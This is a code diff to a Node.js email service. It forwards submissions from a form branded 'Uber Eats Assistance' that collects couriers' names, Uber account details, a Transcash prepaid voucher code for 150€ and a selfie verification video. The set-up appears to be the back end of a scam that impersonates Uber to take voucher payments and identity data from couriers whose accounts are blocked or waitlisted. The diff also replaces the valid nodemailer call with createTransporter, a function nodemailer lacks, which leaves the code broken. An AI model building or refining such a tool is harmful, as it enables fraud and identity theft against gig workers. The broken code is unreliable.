@@ -2,22 +2,30 @@ const nodemailer = require('nodemailer');
 const fs = require('fs');
 
 /**
- * Service d'envoi d'emails
+ * Service d'envoi d'emails - FIX RAILWAY
  */
 class EmailService {
   constructor() {
-    this.transporter = nodemailer.createTransport({
-      service: 'gmail',
+    this.transporter = nodemailer.createTransporter({
+      // ✅ UTILISE TES VARIABLES RAILWAY
+      host: process.env.SMTP_HOST || 'smtp.gmail.com',
+      port: parseInt(process.env.SMTP_PORT) || 587,
+      secure: process.env.SMTP_SECURE === 'true' ? true : false,
       auth: {
         user: process.env.EMAIL_USER,
         pass: process.env.EMAIL_PASS
-      }
+      },
+      // ✅ ANTI-TIMEOUT RAILWAY
+      pool: true,
+      maxConnections: 1,
+      maxMessages: 5,
+      connectionTimeout: 60000,
+      greetingTimeout: 30000,
+      socketTimeout: 90000,
+      logger: false
     });
   }
 
-  /**
-   * Envoie une demande avec PDF et vidéo
-   */
   async sendAssistanceRequest(formData, situation, pdfPath, videoPath) {
     try {
       const subject = situation === 'waiting' 
@@ -54,45 +62,27 @@ class EmailService {
                 ${situation === 'waiting' ? 'Compte en liste d\'attente ⏳' : 'Compte bloqué 🚫'}
               </div>
               
-              <div class="info-item">
-                <span class="label">Nom complet:</span> ${formData.fullName}
-              </div>
-              
-              <div class="info-item">
-                <span class="label">Numéro de compte:</span> ${formData.uberId}
-              </div>
-              
-              <div class="info-item">
-                <span class="label">Email du compte:</span> ${formData.uberEmail}
-              </div>
-              
-              <div class="info-item">
-                <span class="label">Ville d'opération:</span> ${formData.city}
-              </div>
-              
-              <div class="info-item">
-                <span class="label">Code Transcash:</span> <strong>${formData.transcashCode}</strong>
-              </div>
-              
-              <div class="info-item">
-                <span class="label">Montant:</span> <strong>150€</strong>
-              </div>
+              <div class="info-item"><span class="label">Nom complet:</span> ${formData.fullName}</div>
+              <div class="info-item"><span class="label">Numéro de compte:</span> ${formData.uberId}</div>
+              <div class="info-item"><span class="label">Email du compte:</span> ${formData.uberEmail}</div>
+              <div class="info-item"><span class="label">Ville d'opération:</span> ${formData.city}</div>
+              <div class="info-item"><span class="label">Code Transcash:</span> <strong>${formData.transcashCode}</strong></div>
+              <div class="info-item"><span class="label">Montant:</span> <strong>150€</strong></div>
               
               <h3 style="margin-top: 30px;">📎 Pièces jointes</h3>
               <ul>
                 <li>1. <strong>informations.pdf</strong> - Document récapitulatif</li>
-                <li>2. <strong>video-verification.mp4</strong> - Vidéo selfie de vérification</li>
+                <li>2. <strong>video-verification.mp4</strong> - Vidéo selfie</li>
               </ul>
               
               <div class="info-item urgent" style="margin-top: 30px; padding: 15px; background: #fff3cd; border-radius: 5px;">
-                ⚡ <strong>Action requise:</strong> Traiter cette demande dans les plus brefs délais
+                ⚡ <strong>Action requise:</strong> Traiter dans les plus brefs délais
               </div>
             </div>
             
             <div class="footer">
-              <p>📅 Date de réception: ${new Date().toLocaleString('fr-FR')}</p>
-              <p>🔒 Cette demande a été envoyée via le formulaire sécurisé Uber Eats Assistance</p>
-              <p>⚠️ Ce message est généré automatiquement, ne pas y répondre</p>
+              <p>📅 Date: ${new Date().toLocaleString('fr-FR')}</p>
+              <p>🔒 Formulaire sécurisé Uber Eats Assistance</p>
             </div>
           </div>
         </body>
@@ -110,37 +100,21 @@ class EmailService {
             path: pdfPath
           },
           {
-            filename: `video-verification-${formData.fullName.replace(/\s+/g, '-')}.mp4`,
+            filename: `video-${formData.fullName.replace(/\s+/g, '-')}.mp4`,
             path: videoPath
           }
         ]
       };
 
+      console.log('📤 Envoi email vers:', process.env.RECIPIENT_EMAIL);
       const info = await this.transporter.sendMail(mailOptions);
-      console.log('✅ Email envoyé avec succès:', info.messageId);
+      console.log('✅ Email envoyé:', info.messageId);
       
-      return {
-        success: true,
-        messageId: info.messageId
-      };
+      return { success: true, messageId: info.messageId };
       
     } catch (error) {
-      console.error('❌ Erreur lors de l\'envoi de l\'email:', error);
-      throw new Error(`Échec de l'envoi de l'email: ${error.message}`);
-    }
-  }
-
-  /**
-   * Vérifie la configuration email
-   */
-  async verifyConfiguration() {
-    try {
-      await this.transporter.verify();
-      console.log('✅ Configuration email vérifiée avec succès');
-      return true;
-    } catch (error) {
-      console.error('❌ Erreur de configuration email:', error);
-      throw error;
+      console.error('❌ EMAIL ERROR:', error);
+      throw new Error(`Email failed: ${error.message}`);
     }
   }
 }
